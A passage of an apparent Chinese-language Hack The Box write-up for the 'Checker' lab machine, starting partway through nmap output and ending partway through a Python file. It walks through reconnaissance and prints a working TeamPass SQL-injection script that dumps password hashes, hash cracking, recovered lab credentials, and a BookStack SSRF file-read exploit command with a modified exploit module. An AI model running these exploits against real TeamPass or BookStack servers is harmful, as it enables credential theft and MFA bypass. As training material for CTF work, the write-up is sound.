cp ports (conn-refused)\nPORT     STATE SERVICE\n22/tcp   open  ssh\n80/tcp   open  http\n8080/tcp open  http-proxy\n\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 68.70 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -sT -A -T4 -O -p 22,80,8080 10.10.11.56  \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:06 EST\nNmap scan report \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e 10.10.11.56\nHost is up (0.20s latency).\n\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   256 aa:54:07:41:98:b8:11:b0:78:45:f1:ca:8c:5a:94:2e (ECDSA)\n|_  256 8f:2b:f3:22:1e:74:3b:ee:8b:40:17:6c:6c:b1:93:9c (ED25519)\n80/tcp   open  http    Apache httpd\n|_http-title: 403 Forbidden\n|_http-server-header: Apache\n8080/tcp open  http    Apache httpd\n|_http-server-header: Apache\n|_http-title: 403 Forbidden\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Linux 4.15 - 5.8 (96%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.5 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (95%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 - 5.4 (93%)\nNo exact OS matches \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e host (\u003cspan class=\"hljs-built_in\"\u003etest\u003c/span\u003e conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   397.46 ms 10.10.16.1\n2   397.58 ms 10.10.11.56\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap \u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e: 1 IP address (1 host up) scanned \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e 33.63 seconds\n\u003c/code\u003e\u003c/pre\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~  nmap -script=vuln -p 80,8080 10.10.11.56    \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-24 08:07 EST\nPre-scan script results:\n| broadcast-avahi-dos: \n|   Discovered hosts:\n|     224.0.0.251\n|   After NULL UDP avahi packet DoS (CVE-2011-1002).\n|_  Hosts are all up (not vulnerable).\nStats: 0:04:20 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan\nPORT     STATE SERVICE\n80/tcp   open  http\n|_http-dombased-xss: Couldn\u003cspan class=\"hljs-string\"\u003e't find any DOM based XSS.\n|_http-stored-xss: Couldn'\u003c/span\u003et find any stored XSS vulnerabilities.\n|_http-csrf: Couldn\u003cspan class=\"hljs-string\"\u003e't find any CSRF vulnerabilities.\n8080/tcp open  http-proxy\n\nNmap done: 1 IP address (1 host up) scanned in 294.05 seconds\n\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003e10.10.11.56:8080\u003c/code\u003e端口回会加载\u003ccode\u003evault.checker.htb\u003c/code\u003e将写入\u003ccode\u003ehosts\u003c/code\u003e文件\u003c/p\u003e\n\u003cp\u003e扫描子域名，无结果（但是其实会返回\u003ccode\u003e429\u003c/code\u003e，过多的请求，大概率是不要我们去扫描了）\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/checker  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hl=7,8 -H \u003cspan class=\"hljs-string\"\u003e'Host:FUZZ.checker.\nhtb'\u003c/span\u003e -u checker.htb                                                                                                                                          \n********************************************************                                                                                                     \n* Wfuzz 3.1.0 - The Web Fuzzer equests: 4989                                                                                                                                      \nRequests/sec.: 0                     \n\n⚡ root@kali  ~/Desktop/test/checker  wfuzz -c -w ../../Dict/SecLists-2024.3/Discovery/DNS/subdomains-top1million-5000.txt --hl=7,8 -H \u003cspan class=\"hljs-string\"\u003e'Host:FUZZ.checker.\nhtb:8080'\u003c/span\u003e -u checker.htb:8080           \n********************************************************                                                                                                     \n* Wfuzz 3.1.0 - The Web Fuzzer                         *                                                                                                     \n********************************************************                                                                                                     \n                                                                                                                                                             \nTarget: http://checker.htb:8080/                                                                                                                             \nTotal requests: 4989                                                                                                                                         \n                                                                                                                                                             \n=====================================================================                                                                                        \nID           Response   Lines    Word       Chars       Payload                                                                                              \n=====================================================================          \nTotal \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e: 0                                                                                                                                                \nProcessed Requests: 4989                                                                                                                                     \nFiltered Requests: 4989                                                                                                                                      \nRequests/sec.: 0                                                                                                                                             \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e访问\u003ccode\u003eHTTP\u003c/code\u003e服务，进来就是一个输入框，\u003ccode\u003eBookStack\u003c/code\u003e 使用 PHP 和 Laravel 构建的创建文档/wiki 内容的平台\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image12.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e访问\u003ccode\u003e8080\u003c/code\u003e端口，也是登录框，\u003ccode\u003eteampass\u003c/code\u003e  协作密码管理器\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image13.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eTeamPass 利用\u003c/h2\u003e\n\u003cp\u003e经查阅\u003ccode\u003eTeampass\u003c/code\u003e存在\u003ccode\u003eSQL\u003c/code\u003e注入漏洞： \u003ca href=\"https://huntr.com/bounties/942c015f-7486-49b1-94ae-b1538d812bc2\"\u003ehttps://huntr.com/bounties/942c015f-7486-49b1-94ae-b1538d812bc2\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003ePOC：\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e [ \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$#\u003c/span\u003e\"\u003c/span\u003e -lt 1 ]; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"Usage: \u003cspan class=\"hljs-variable\"\u003e$0\u003c/span\u003e \u0026#x3C;base-url\u003e\"\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e 1\n\u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\nvulnerable_url=\u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e/api/index.php/authorize\"\u003c/span\u003e\n\ncheck=$(curl --silent \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$vulnerable_url\u003c/span\u003e\"\u003c/span\u003e)\n\u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$check\u003c/span\u003e\"\u003c/span\u003e | grep -q \u003cspan class=\"hljs-string\"\u003e\"API usage is not allowed\"\u003c/span\u003e; \u003cspan class=\"hljs-keyword\"\u003ethen\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"API feature is not enabled :-(\"\u003c/span\u003e\n  \u003cspan class=\"hljs-built_in\"\u003eexit\u003c/span\u003e 1\n\u003cspan class=\"hljs-keyword\"\u003efi\u003c/span\u003e\n\n\u003cspan class=\"hljs-comment\"\u003e# htpasswd -bnBC 10 \"\" h4ck3d | tr -d ':\\n'\u003c/span\u003e\narbitrary_hash=\u003cspan class=\"hljs-string\"\u003e'$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'\u003c/span\u003e\n\n\u003cspan class=\"hljs-function\"\u003e\u003cspan class=\"hljs-title\"\u003eexec_sql\u003c/span\u003e\u003c/span\u003e() {\n  inject=\u003cspan class=\"hljs-string\"\u003e\"none' UNION SELECT id, '\u003cspan class=\"hljs-variable\"\u003e$arbitrary_hash\u003c/span\u003e', (\u003cspan class=\"hljs-variable\"\u003e$1\u003c/span\u003e), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin\"\u003c/span\u003e\n  data=\u003cspan class=\"hljs-string\"\u003e\"{\\\"login\\\":\\\"\"\u003c/span\u003e\u003cspan class=\"hljs-variable\"\u003e$inject\u003c/span\u003e\\\"\u003cspan class=\"hljs-string\"\u003e\",\\\"password\\\":\\\"h4ck3d\\\", \\\"apikey\\\": \\\"foo\\\"}\"\u003c/span\u003e\n  token=$(curl --silent --header \u003cspan class=\"hljs-string\"\u003e\"Content-Type: application/json\"\u003c/span\u003e -X POST --data \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$data\u003c/span\u003e\"\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$vulnerable_url\u003c/span\u003e\"\u003c/span\u003e | jq -r \u003cspan class=\"hljs-string\"\u003e'.token'\u003c/span\u003e)\n  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e $(\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-variable\"\u003e$token\u003c/span\u003e| \u003cspan class=\"hljs-built_in\"\u003ecut\u003c/span\u003e -d\u003cspan class=\"hljs-string\"\u003e\".\"\u003c/span\u003e -f2 | \u003cspan class=\"hljs-built_in\"\u003ebase64\u003c/span\u003e -d 2\u003e/dev/null | jq -r \u003cspan class=\"hljs-string\"\u003e'.public_key'\u003c/span\u003e)\n}\n\n\u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e=$(exec_sql \u003cspan class=\"hljs-string\"\u003e\"SELECT COUNT(*) FROM teampass_users WHERE pw != ''\"\u003c/span\u003e)\n\n\u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"There are \u003cspan class=\"hljs-variable\"\u003e$users\u003c/span\u003e users in the system:\"\u003c/span\u003e\n\n\u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e `\u003cspan class=\"hljs-built_in\"\u003eseq\u003c/span\u003e 0 $((\u003cspan class=\"hljs-variable\"\u003e$users\u003c/span\u003e-\u003cspan class=\"hljs-number\"\u003e1\u003c/span\u003e))`; \u003cspan class=\"hljs-keyword\"\u003edo\u003c/span\u003e\n  username=$(exec_sql \u003cspan class=\"hljs-string\"\u003e\"SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT \u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e,1\"\u003c/span\u003e)\n  password=$(exec_sql \u003cspan class=\"hljs-string\"\u003e\"SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT \u003cspan class=\"hljs-variable\"\u003e$i\u003c/span\u003e,1\"\u003c/span\u003e)\n  \u003cspan class=\"hljs-built_in\"\u003eecho\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e\"\u003cspan class=\"hljs-variable\"\u003e$username\u003c/span\u003e: \u003cspan class=\"hljs-variable\"\u003e$password\u003c/span\u003e\"\u003c/span\u003e\n\u003cspan class=\"hljs-keyword\"\u003edone\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e成功读到用户\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/checker  ./poc.sh checker.htb:8080\nThere are 2 \u003cspan class=\"hljs-built_in\"\u003eusers\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e the system:\nadmin: $2y$10\u003cspan class=\"hljs-variable\"\u003e$lKCae0EIUNj6f96ZnLqnC\u003c/span\u003e.LbWqrBQCT1LuHEFht6PmE4yH75rpWya\nbob: $2y$10\u003cspan class=\"hljs-variable\"\u003e$yMypIj1keU\u003c/span\u003e.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e使用\u003ccode\u003ejohn\u003c/code\u003e爆破，得到\u003ccode\u003ebob\u003c/code\u003e密码\u003ccode\u003echeerleader\u003c/code\u003e\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e⚡ root@kali  ~/Desktop/test/checker  john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.txt\nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (bcrypt [Blowfish 32/64 X3])\nCost 1 (iteration count) is 1024 \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e all loaded hashes\nWill run 8 OpenMP threads\nPress \u003cspan class=\"hljs-string\"\u003e'q'\u003c/span\u003e or Ctrl-C to abort, almost any other key \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e status\ncheerleader      (?)     \n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e登陆后台，成功进入\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image14.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e还可以找到\u003ccode\u003eBookStack\u003c/code\u003e的账号密码 \u003ccode\u003ebob@checker.htb\u003c/code\u003e : \u003ccode\u003emYSeCr3T_w1kI_P4sSw0rD\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image15.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e还可以找到\u003ccode\u003eSSH\u003c/code\u003e的账号密码 \u003ccode\u003ereader\u003c/code\u003e : \u003ccode\u003ehiccup-publicly-genesis\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image16.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e登录\u003ccode\u003eSSH\u003c/code\u003e ，输入密码后还要输入\u003ccode\u003eVerification code\u003c/code\u003e (\u003ccode\u003eMFA\u003c/code\u003e 双因子认证登录)\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image17.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003ch2\u003eBookStack\u003c/h2\u003e\n\u003cp\u003e拿到\u003ccode\u003ebob\u003c/code\u003e用户凭据登录\u003ccode\u003eBookStack\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image18.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e试了一下\u003ccode\u003eBookStack\u003c/code\u003e 添加书籍时插入代码，但是不成功\u003c/p\u003e\n\u003cp\u003e到\u003ccode\u003eBookStack\u003c/code\u003e的官网下找文档，发现里面有\u003ccode\u003eMFA\u003c/code\u003e认证，可能是和\u003ccode\u003eheader\u003c/code\u003e的有关\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://www.bookstackapp.com/docs/admin/security/#multi-factor-authentication\"\u003ehttps://www.bookstackapp.com/docs/admin/security/#multi-factor-authentication\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image19.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e在个人界面里面也能找到 \u003ccode\u003eSetup Multi-Factor Authentication\u003c/code\u003e 选项\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image20.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e底下的的\u003ccode\u003eBackup Codes\u003c/code\u003e （将以下代码列表存储在安全的地方。访问系统时，您将能够将其中一个代码用作第二个身份验证机制）但是在我使用脚本尝试了很多次之后都无法进入，拼尽全力无法战胜（香蕉猫）\u003c/p\u003e\n\u003cp\u003e继续进行信息收集，在\u003ccode\u003eadmin\u003c/code\u003e写的\u003ccode\u003eLinux-security\u003c/code\u003e发现一个路径\u003ccode\u003e/backup/home_backup\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image21.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e找到一个SSRF漏洞：\u003ca href=\"https://fluidattacks.com/advisories/imagination/\"\u003ehttps://fluidattacks.com/advisories/imagination/\u003c/a\u003e | \u003ca href=\"https://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/\"\u003ehttps://fluidattacks.com/blog/lfr-via-blind-ssrf-book-stack/\u003c/a\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003eA server-side request forgery (SSRF) vulnerability has been identified in Book Stack that, under certain conditions, could allow an attacker to obtain local files from the server. The attacker must have writer permissions. | 某些条件下攻击者可以获取本地文件\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cp\u003e根据漏洞报告可以找到利用工具：\u003ca href=\"https://github.com/synacktiv/php_filter_chains_oracle_exploit\"\u003ehttps://github.com/synacktiv/php_filter_chains_oracle_exploit\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e读取的文件是：\u003ccode\u003e/backup/home_backup/home/reader/.google_authenticator\u003c/code\u003e\u003c/p\u003e\n\u003cblockquote\u003e\n\u003cp\u003e这个文件包含了与 Google Authenticator 相关的密钥和配置信息。每个用户在启用 2FA 时，Google Authenticator 会生成一个密钥，并将其保存到 \u003ccode\u003e.google_authenticator\u003c/code\u003e 文件中。这个密钥是用来生成 TOTP 的核心数据\u003c/p\u003e\n\u003c/blockquote\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// POC\npython filters_chain_oracle_exploit.py \\\n  --target \u003cspan class=\"hljs-string\"\u003e\"http://checker.htb/ajax/page/12/save-draft\"\u003c/span\u003e \\\n  --file \u003cspan class=\"hljs-string\"\u003e\"/backup/home_backup/home/reader/.google_authenticator\"\u003c/span\u003e \\\n  --parameter \u003cspan class=\"hljs-string\"\u003e\"html\"\u003c/span\u003e \\\n  --verb PUT \\\n  --headers \u003cspan class=\"hljs-string\"\u003e\"{\\\"X-CSRF-TOKEN\\\": \\\"\u003cspan class=\"hljs-variable\"\u003e$CSRF\u003c/span\u003e-TOKEN\\\", \\\"Content-Type\\\": \\\"application/x-www-form-urlencoded\\\", \\\"Cookie\\\": \\\"jstree_select=1; XSRF-TOKEN=\u003cspan class=\"hljs-variable\"\u003e$XSRF\u003c/span\u003e-TOKEN; bookstack_session=\u003cspan class=\"hljs-variable\"\u003e$BookStack\u003c/span\u003e\\\"}\"\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e我们新建书本添加新页面后点击保存的包即可获得上面所需所有参数\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image22.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"/post-images/HackTheBoxSeason7-Checker/image23.png\" alt=\"image.png\"\u003e\u003c/p\u003e\n\u003cp\u003e使用工具前需要替换新的\u003ccode\u003ephp_filter_chains_oracle_exploit/filters_chain_oracle/core/requestor.py\u003c/code\u003e文件，不然很容易出现错误\u003c/p\u003e\n\u003cpre\u003e\u003ccode class=\"hljs language-bash\"\u003e// new requestor.py\nimport json\nimport requests\nimport \u003cspan class=\"hljs-keyword\"\u003etime\u003c/span\u003e\nimport \u003cspan class=\"hljs-built_in\"\u003ebase64\u003c/span\u003e  \u003cspan class=\"hljs-comment\"\u003e# Ensure base64 module is imported\u003c/span\u003e\nfrom filters_chain_oracle.core.verb import Verb\nfrom filters_chain_oracle.core.utils import merge_dicts\nimport re\n\n\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\nClass Requestor, defines all the request logic.\n\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\nclass Requestor:\n    def __init__(self, file_to_leak, target, parameter, data=\u003cspan class=\"hljs-string\"\u003e\"{}\"\u003c/span\u003e, headers=\u003cspan class=\"hljs-string\"\u003e\"{}\"\u003c/span\u003e, verb=Verb.POST, in_chain=\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e, proxy=None, time_based_attack=False, delay=0.0, json_input=False, match=False):\n        self.file_to_leak = file_to_leak\n        self.target = target\n        self.parameter = parameter\n        self.headers = headers\n        self.verb = verb\n        self.json_input = json_input\n        self.match = match\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] The following URL is targeted : {}\"\u003c/span\u003e.format(self.target))\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] The following local file is leaked : {}\"\u003c/span\u003e.format(self.file_to_leak))\n        \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] Running {} requests\"\u003c/span\u003e.format(self.verb.name))\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e data != \u003cspan class=\"hljs-string\"\u003e\"{}\"\u003c/span\u003e:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] Additionnal data used : {}\"\u003c/span\u003e.format(data))\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e headers != \u003cspan class=\"hljs-string\"\u003e\"{}\"\u003c/span\u003e:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] Additionnal headers used : {}\"\u003c/span\u003e.format(headers))\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e in_chain != \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] The following chain will be in each request : {}\"\u003c/span\u003e.format(in_chain))\n            in_chain = \u003cspan class=\"hljs-string\"\u003e\"|convert.iconv.{}\"\u003c/span\u003e.format(in_chain)\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e match:\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[*] The following pattern will be matched for the oracle : {}\"\u003c/span\u003e.format(match))\n        self.in_chain = in_chain\n        self.data = json.loads(data)\n        self.headers = json.loads(headers)\n        self.delay = \u003cspan class=\"hljs-built_in\"\u003efloat\u003c/span\u003e(delay)\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e proxy :\n            self.proxies = {\n                \u003cspan class=\"hljs-string\"\u003e'http'\u003c/span\u003e: f\u003cspan class=\"hljs-string\"\u003e'{proxy}'\u003c/span\u003e,\n                \u003cspan class=\"hljs-string\"\u003e'https'\u003c/span\u003e: f\u003cspan class=\"hljs-string\"\u003e'{proxy}'\u003c/span\u003e,\n            }\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n            self.proxies = None\n        self.instantiate_session()\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e time_based_attack:\n            self.time_based_attack = self.error_handling_duration()\n            \u003cspan class=\"hljs-built_in\"\u003eprint\u003c/span\u003e(\u003cspan class=\"hljs-string\"\u003e\"[+] Error handling duration : {}\"\u003c/span\u003e.format(self.time_based_attack))\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n            self.time_based_attack = False\n        \n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    Instantiates a requests session for optimization\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    def instantiate_session(self):\n        self.session = requests.Session()\n        self.session.headers.update(self.headers)\n        self.session.proxies = self.proxies\n        self.session.verify = False\n\n    def \u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(self, *x):\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'|'\u003c/span\u003e.\u003cspan class=\"hljs-built_in\"\u003ejoin\u003c/span\u003e(x)\n\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    Used to see how much time a 500 error takes to calibrate the timing attack\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    def error_handling_duration(self):\n        chain = \u003cspan class=\"hljs-string\"\u003e\"convert.base64-encode\"\u003c/span\u003e\n        requ = self.req_with_response(chain)\n        self.normal_response_time = requ.elapsed.total_seconds()\n        self.blow_up_utf32 = \u003cspan class=\"hljs-string\"\u003e'convert.iconv.L1.UCS-4'\u003c/span\u003e\n        self.blow_up_inf = self.join(*[self.blow_up_utf32]*15)\n        chain_triggering_error = f\u003cspan class=\"hljs-string\"\u003e\"convert.base64-encode|{self.blow_up_inf}\"\u003c/span\u003e\n        requ = self.req_with_response(chain_triggering_error)\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e requ.elapsed.total_seconds() - self.normal_response_time\n\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    Used to parse the option parameter sent by the user\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    def parse_parameter(self, filter_chain):\n        data = {}\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"hljs-string\"\u003e'['\u003c/span\u003e and \u003cspan class=\"hljs-string\"\u003e']'\u003c/span\u003e \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e self.parameter: \u003cspan class=\"hljs-comment\"\u003e# Parse array elements\u003c/span\u003e\n            \n            main_parameter = [re.search(r\u003cspan class=\"hljs-string\"\u003e'^(.*?)\\['\u003c/span\u003e, self.parameter).group(1)]\n            sub_parameters = re.findall(r\u003cspan class=\"hljs-string\"\u003e'\\[(.*?)\\]'\u003c/span\u003e, self.parameter)\n            all_params = main_parameter + sub_parameters\n            json_object = {}\n            temp = json_object\n            \u003cspan class=\"hljs-keyword\"\u003efor\u003c/span\u003e i, element \u003cspan class=\"hljs-keyword\"\u003ein\u003c/span\u003e enumerate(all_params):\n                \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e i == len(all_params) -1:\n                    temp[element] = filter_chain\n                \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n                    temp[element] = {}\n                    temp = temp[element]\n            data = json_object\n        \u003cspan class=\"hljs-keyword\"\u003eelse\u003c/span\u003e:\n            data[self.parameter] = filter_chain\n        \u003cspan class=\"hljs-built_in\"\u003ereturn\u003c/span\u003e merge_dicts(data, self.data)\n\n    \u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\n    Returns the response of a request defined with all options\n    \"\u003c/span\u003e\u003cspan class=\"hljs-string\"\u003e\"\"\u003c/span\u003e\n    def req_with_response(self, s):\n        \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.delay \u003e 0:\n            time.sleep(self.delay)\n\n        filter_chain = f\u003cspan class=\"hljs-string\"\u003e'php://filter/{s}{self.in_chain}/resource={self.file_to_leak}'\u003c/span\u003e\n        \u003cspan class=\"hljs-comment\"\u003e# DEBUG print(filter_chain)\u003c/span\u003e\n        merged_data = self.parse_parameter(filter_chain)\n\n        \u003cspan class=\"hljs-comment\"\u003e# Fix indentation: Encode filter chain in Base64\u003c/span\u003e\n        encoded_bytes = base64.b64encode(filter_chain.encode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e))\n        encoded_str = encoded_bytes.decode(\u003cspan class=\"hljs-string\"\u003e'utf-8'\u003c/span\u003e)\n        payload = f\u003cspan class=\"hljs-string\"\u003e\"\u0026#x3C;img src='data:image/png;base64,{encoded_str}'/\u003e\"\u003c/span\u003e\n        merged_data[self.parameter] = payload  \u003cspan class=\"hljs-comment\"\u003e# Fixed indentation\u003c/span\u003e\n\n        \u003cspan class=\"hljs-comment\"\u003e# Make the request, the verb and data encoding is defined\u003c/span\u003e\n        try:\n            \u003cspan class=\"hljs-keyword\"\u003eif\u003c/span\u003e self.verb == Verb.GET:\n                requ = self.session.get(self.target, params=merged_data)\n                \u003cspan 